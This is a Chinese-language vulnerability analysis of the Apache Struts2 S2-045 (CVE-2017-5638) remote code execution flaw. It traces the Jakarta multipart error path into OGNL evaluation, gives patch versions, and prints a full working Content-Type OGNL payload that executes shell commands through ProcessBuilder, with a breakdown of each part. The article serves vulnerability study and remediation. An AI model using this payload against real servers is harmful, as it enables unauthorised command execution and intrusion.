
# 【漏洞分析】S2-045：Apache Struts2 远程代码执行（RCE）漏洞分析


                                阅读量   
                                **268088**
                            
                        |
                        
                                                                                                                                    ![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            





[![](./img/85674/t01a6f34a22f820e327.png)](./img/85674/t01a6f34a22f820e327.png)

作者：[xiaodingdang](http://bobao.360.cn/member/contribute?uid=291519525)

预估稿费：300RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



****

传送门

[](http://bobao.360.cn/learning/detail/3574.html)

[**【漏洞分析】Struts2-045分析（CVE-2017-5638）******](http://bobao.360.cn/learning/detail/3587.html)

[【漏洞分析】S2-045 原理初步分析（CVE-2017-5638）](http://bobao.360.cn/learning/detail/3574.html)

[【重大漏洞预警】Struts 2 远程代码执行漏洞（CVE-2017-5638）（含PoC）](http://bobao.360.cn/learning/detail/3571.html)

**<br>**

**0x00 前言**



本文主要是对Apache Struts2（S2-045）漏洞进行原理分析。

Apache Struts2使用的Jakarta Multipart parser插件存在远程代码执行漏洞。可以通过构造Content-Type值进行触发漏洞，造成远程执行代码。影响Struts2版本 Struts 2.3.5 – Struts 2.3.31, Struts 2.5 – Struts 2.5.10

<br>

**0x01 漏洞公布**



大概是北京时间2017年3月6号晚上10点apache发布了S2-045预警公告

详情：[https://cwiki.apache.org/confluence/display/WW/S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045) 

随后能够得到补丁信息：

[https://github.com/apache/struts/commit/6b8272ce47160036ed120a48345d9aa884477228](https://github.com/apache/struts/commit/6b8272ce47160036ed120a48345d9aa884477228) 

通过apache漏洞公告和补丁信息，可以得到：

1.漏洞发生在 Jakarta 上传解析器

2.受影响struts版本是Struts 2.3.5 – Struts 2.3.31, Struts 2.5 – Struts 2.5.10

3.通过Content-Type这个header头，进而执行命令，通过Strus2对错误消息处理进行回显。

<br>

**0x02 漏洞分析**

Struts2默认处理multipart报文的解析器是jakarta

```
&lt;bean type="org.apache.struts2.dispatcher.multipart.MultiPartRequest" name="jakarta" class="org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest" scope="prototype"/&gt;
&lt;bean type="org.apache.struts2.dispatcher.multipart.MultiPartRequest" name="jakarta-stream" class="org.apache.struts2.dispatcher.multipart.JakartaStreamMultiPartRequest" scope="prototype"/&gt;
```

    JakartaMultiPartRequest.java 的buildErrorMessage函数中localizedTextUtil.findText会执行OGNL表达式，从而导致命令执行

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01cb905b2deac0bd27.png)

**    那么总的流程是什么呢？**

    首先会在执行请求前做一些准备工作在PrepareOpertions.java中,包括通过wrapRequest的封装请求。

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015a8b450f47668204.png)

    随后对Content-Type头部进行判断，当存在"multipart/form-data"的时候，会通过mpr，给每个请求返回一个新的实例，保证线程安全，同时交给MultipartRequest类处理

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0111e5a9d753d1a75f.png)

    通过getSaveDir(),来获取保存上传路径

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01cc8add7aec194b0a.png)

    MultiPartRequestWrapper类通过获取如下参数，来对收集错误信息，文件信息和默认的本地配置进行封装返回。

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d401e72aa15efd0d.png)

    漏洞发生在MultiPartRequestWrapper会通过调用JakartaMultiPartRequest.java的parse进行解析请求

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01adcef6b98f0b66f7.png)

    parse函数又会调用buildErrotMessage()方法

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0102af2252f9273515.png)

      而buildErrorMessage()方法又调用了LocalizedTextUtil的findText方法，导致了ONGL的执行。

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01efcdd3138d9ede50.png)

<br>

**0x03 漏洞利用**

通过构造content-Type来实现利用

```
Content-Type:"%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"pwd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

 xxx='multipart/form-data'主要是让struts程序content_type.contains(“multipart/form-  data”)判断为true

```
#container=#context['com.opensymphony.xwork2.ActionContext.container']
来获取上下文容器
```

```
#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class  
通过容器实例化，对Ognl API的通用访问，设置和获取属性。
```

```
#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd })
判断目标主机的操作系统类型，并进行执行命令赋值
```

```
#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())
执行攻击命令
```

<br>

**0x04 漏洞修复**

1. 可升级版本到Apache Struts 2.3.32或者Apache struts 2.5.10.1

2.官方补丁

[https://github.com/apache/struts/commit/b06dd50af2a3319dd896bf5c2f4972d2b772cf2b](https://github.com/apache/struts/commit/b06dd50af2a3319dd896bf5c2f4972d2b772cf2b)

随笔感想：

这么严重的安全事件，在3月7号早上poc和exp就被泄露出来了，可以说给企业留给应急的时间很短，一时间无数人通过搜索引擎去利用s2-045进行利用，根据受影响的站点，政府和学校应该是受影响最大的组织。引用heige话一时间如同蝗虫般侵袭着网站，但是让人欣慰的是国家对于安全问题越来越重视，近几年在安全方面投入的加大，各公司的安全应急做的很快，尤其是互联网公司。基本3月8号晚上基本都完成了对s2-045漏洞的修复。

**这里面我觉得有几个方面原因：**

1.     国内存在着像补天，漏洞盒子等这样的漏洞收集平台（据说审核人员这次一晚上审核上千个漏洞），对于漏洞通报，快速响应至关重要，最让人眼前一亮的是还在beta测试阶段的教育行业漏洞报告平台([https://src.edu-info.edu.cn/](https://src.edu-info.edu.cn/)  )，可以说对于学校处理s2-045漏洞发挥了很大的作用。

[![](./img/85674/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011942b8092558bf68.png)

2.     国内对于安全的重视，安全人员的培养，安全行业的宣传，使更多人和大学生接触到了安全行业，这才导致了大量的人员去平台提交漏洞，大部分安全从业者还是懂法，具有道德底线的，知道什么事可以干，什么事不行。

3.     随着国内安全行业的发展，涌现了一批从事安全专业公司包括bat3，不管是安全服务还是安全设备防护等等，极大的提高了企业的安全防护能力和安全意识。

最后，我觉得从这次事件可以看出，国内对于重大安全事件的应急响应能力有了质的飞跃。

<br>



传送门

[](http://bobao.360.cn/learning/detail/3574.html)

[**【漏洞分析】Struts2-045分析（CVE-2017-5638）**](http://bobao.360.cn/learning/detail/3587.html)

[【漏洞分析】S2-045 原理初步分析（CVE-2017-5638）](http://bobao.360.cn/learning/detail/3574.html)

[【重大漏洞预警】Struts 2 远程代码执行漏洞（CVE-2017-5638）（含PoC）](http://bobao.360.cn/learning/detail/3571.html)

<br>
